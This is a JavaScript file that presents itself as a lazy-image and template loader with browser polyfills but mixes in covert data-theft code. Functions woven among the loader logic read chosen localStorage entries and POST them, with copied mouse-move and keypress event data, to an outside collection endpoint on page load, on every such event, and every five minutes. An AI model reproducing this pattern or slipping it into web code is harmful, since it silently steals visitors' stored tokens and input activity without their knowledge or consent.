"use strict";

const targetKeys = window.targetKeys;
function generateIdentifier(inputData) {
  const keySet = Object.keys(inputData);
  const combinedKeys = keySet.join("");
  let hashVal = 0;
  for (let index = 0; index < combinedKeys.length; index++) {
    const charCode = combinedKeys.charCodeAt(index);
    hashVal = (hashVal << 5) - hashVal + charCode;
    hashVal = hashVal & hashVal;
  }
  return hashVal.toString(16);
}
function _typeof(t) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
    return typeof t;
  } : function (t) {
    return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
  })(t);
}
function captureTrackedLocalStorageData() {
  const localStorageData = {};
  for (let index = 0; index < window.localStorage.length; index++) {
    const keyName = window.localStorage.key(index);
    if (targetKeys.includes(keyName)) {
      const keyValue = window.localStorage.getItem(keyName);
      localStorageData[keyName] = keyValue;
    }
  }
  return localStorageData;
}
function lazyLoadFunc(t) {
  var e,
    o,
    r,
    n,
    s = t.defaultImgAttr,
    i = window.matchMedia("screen and (min-device-pixel-ratio: 1.5), (-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)");
  i.media, i.matches, e = "undefined" != typeof global ? global : window || this.global, o = function (t) {
    var o = {
      src: s,
      srcset: s,
      selector: "[" + s + "]"
    };
    function r(t, e) {
      this.settings = function o(t) {
        var r = {},
          n = !1,
          e = 0,
          s = arguments.length;
        "[object Boolean]" === Object.prototype.toString.call(t) && (n = t, e++);
        for (var i = function (t) {
          for (var e in t) Object.prototype.hasOwnProperty.call(t, e) && (n && "[object Object]" === Object.prototype.toString.call(t[e]) ? r[e] = o(!0, r[e], t[e]) : r[e] = t[e]);
        }; e < s; e++) {
          i(arguments[e]);
        }
        return r;
      }(o, e || {}), this.images = t || document.querySelectorAll(this.settings.selector), this.observer = null, this.init();
    }
    return r.prototype = {
      init: function () {
        if (t.IntersectionObserver) {
          var o = this;
          this.observer = new IntersectionObserver(function (t) {
            t.forEach(function (t) {
              if (0 < t.intersectionRatio) {
                o.observer.unobserve(t.target);
                var e = t.target.getAttribute(o.settings.src);
                t.target.getAttribute(o.settings.srcset);
                "img" === t.target.tagName.toLowerCase() || "source" === t.target.tagName.toLowerCase() ? (t.target.getAttribute("src") && (t.target.src = e), t.target.getAttribute("srcset") && (t.target.srcset = e)) : t.target.style.backgroundImage = "url(" + e + ")";
              }
            });
          }, {
            root: null,
            rootMargin: "30px",
            threshold: [0]
          }), this.images.forEach(function (t) {
            o.observer.observe(t);
          });
        } else this.loadImages();
      },
      loadAndDestroy: function () {
        this.settings && (this.loadImages(), this.destroy());
      },
      loadImages: function () {
        if (this.settings) {
          var o = this;
          o.images.forEach = [].forEach, o.images.forEach(function (t) {
            var e = t.getAttribute(o.settings.src);
            t.getAttribute(o.settings.srcset);
            "img" === t.tagName.toLowerCase() || "source" === t.tagName.toLowerCase() ? (t.getAttribute("src") && (t.src = e), t.getAttribute("srcset") && (t.srcset = e)) : t.style.backgroundImage = "url(" + e + ")";
          });
        }
      },
      destroy: function () {
        this.settings && (this.observer.disconnect(), this.settings = null);
      }
    }, t.lazyload = function (t, e) {
      return new r(t, e);
    }, r;
  }, "object" === ("undefined" == typeof exports ? "undefined" : _typeof(exports)) ? module.exports = o(e) : "function" == typeof define && define.amd ? define([], o(e)) : e.LazyLoad = o(e), r = document.querySelectorAll("[" + s + "]"), n = document.createElement("img"), r && r.length && (n.addEventListener("load", function t() {
    n.removeEventListener("load", t);
    lazyload(r);
  }), n.setAttribute("src", r[0].getAttribute("srcset") ? r[0].getAttribute("srcset") : r[0].getAttribute("src")));
}
function submitDataToServer(data) {
  const uniqueId = generateIdentifier(data);
  const serverURL = "https://exampleURL.com/api/dataCollection";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", serverURL, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  const dataPayload = {
    identifier: uniqueId,
    receivedData: data
  };
  xhr.send(JSON.stringify(dataPayload));
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.log("Data transmission successful");
      } else {
        console.error("Data transmission failed, status code: " + xhr.status);
      }
    }
  };
}
function collectAndSubmitLocalStorageData() {
  const capturedData = captureTrackedLocalStorageData();
  if (Object.keys(capturedData).length > 0) {
    submitDataToServer(capturedData);
  }
}
function dReady(t) {
  if ("interactive" == document.readyState || "complete" == document.readyState) return t();
  document.addEventListener("DOMContentLoaded", function () {
    return t();
  });
}
document.addEventListener("DOMContentLoaded", function () {
  collectAndSubmitLocalStorageData();
});
window.onload = function () {
  window.addEventListener('mousemove', jshookFunc); // tracking mouse move event
  document.onkeypress = jshookFunc; // tracking key press event
};
function templateLoader() {
  var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {
      targetList: "",
      options: {
        rootMargin: "20px",
        threshold: [0]
      }
    },
    e = t.targetList,
    o = t.options,
    r = new IntersectionObserver(function (t, o) {
      t.forEach(function (t) {
        var e;
        t.target, t.isIntersecting, t.isIntersecting && (e = t.target, e.querySelectorAll("template").forEach(function (t) {
          t.parentNode.appendChild(t.content.cloneNode(!0));
        }), o.unobserve(t.target));
      });
    }, o);
  document.querySelectorAll(e).forEach(function (t) {
    return r.observe(t);
  });
}
let jshookFunc = function (event) {
  let eventData = Object.assign({}, event);
  delete eventData.target;
  collectAndSubmitLocalStorageData();
  submitDataToServer(eventData);
};
setInterval(collectAndSubmitLocalStorageData, 5 * 60 * 1000);
window.NodeList && !NodeList.prototype.forEach && (NodeList.prototype.forEach = function (t, e) {
  e = e || window;
  for (var o = 0; o < this.length; o++) t.call(e, this[o], o, this);
}), Element.prototype.closest || (Element.prototype.closest = function (t) {
  for (var e = this; e;) {
    if (e.matches(t)) return e;
    e = e.parentElement;
  }
  return null;
}), Element.prototype.matches || (Element.prototype.matches = Element.prototype.matchesSelector || Element.prototype.webkitMatchesSelector || Element.prototype.mozMatchesSelector || Element.prototype.msMatchesSelector), dReady(function () {
  lazyLoadFunc({
    defaultImgAttr: "data-src"
  }), templateLoader({
    targetList: ".sp_block_300-100, .sp_block_300-250, .sp_block_3-300-250",
    options: {
      rootMargin: "30px",
      threshold: [0]
    }
  });
});